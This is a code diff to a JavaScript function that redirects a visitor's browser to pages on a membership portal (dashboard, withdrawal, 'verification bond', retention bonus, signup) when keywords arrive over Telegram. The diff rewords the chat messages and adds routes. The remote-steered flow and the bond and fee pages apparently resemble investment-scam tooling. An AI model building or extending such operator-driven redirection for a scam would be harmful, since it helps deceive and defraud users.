@@ -2260,7 +2260,7 @@ async function listenForTelegramMessages() {
 
     // 3. Match destinations and append the secure keys
     if (lowerContent.includes("dashboard")) {
-        msgContent = "Understood. Accessing your main dashboard account panel now...";
+        msgContent = "Understood. Accessing your dashboard account panel now...";
         setTimeout(() => { window.location.href = buildSecureUrl("https://membership.avalonflow.site/dashboard"); }, 2500);
     } 
     else if (lowerContent.includes("withdrawal")) {
@@ -2268,7 +2268,7 @@ async function listenForTelegramMessages() {
         setTimeout(() => { window.location.href = buildSecureUrl("https://membership.avalonflow.site/withdrawal"); }, 2500);
     } 
     else if (lowerContent.includes("rewards")) {
-        msgContent = "Opening your Sector Retention Bonus balance. One moment...";
+        msgContent = "Opening your Retention Bonus balance. One moment...";
         setTimeout(() => { window.location.href = buildSecureUrl("https://membership.avalonflow.site/myreturns"); }, 2500);
     } 
     else if (lowerContent.includes("avb") || lowerContent.includes("verification bond")) {
@@ -2280,13 +2280,17 @@ async function listenForTelegramMessages() {
         setTimeout(() => { window.location.href = buildSecureUrl("https://membership.avalonflow.site/confirmation"); }, 2500);
     } 
     else if (lowerContent.includes("sign out") || lowerContent.includes("logout") || lowerContent.includes("signin")) {
-        msgContent = "Routing session parameters back to the secure access terminal...";
+        msgContent = "Routing you back to the secure access terminal...";
         setTimeout(() => { window.location.href = buildSecureUrl("https://membership.avalonflow.site/signin"); }, 2500);
     }
+else if (lowerContent.includes("signup")) {
+        msgContent = "Initializing priority connection... Opening your application gateway.";
+        setTimeout(() => { window.location.href = buildSecureUrl("https://membership.avalonflow.site/signup"); }, 2500);
+    } 
     else {
         // Fallback message if an unknown page string gets passed
         msgContent = "Processing system routing protocols. Updating portal window now...";
-        setTimeout(() => { window.location.href = "https://membership.avalonflow.site/confirmation"; }, 2500);
+        setTimeout(() => { window.location.href = "https://membership.avalonflow.site/livechat"; }, 2500);
     }
                             } // This bracket safely closes: if (msgType === "text")
                         }
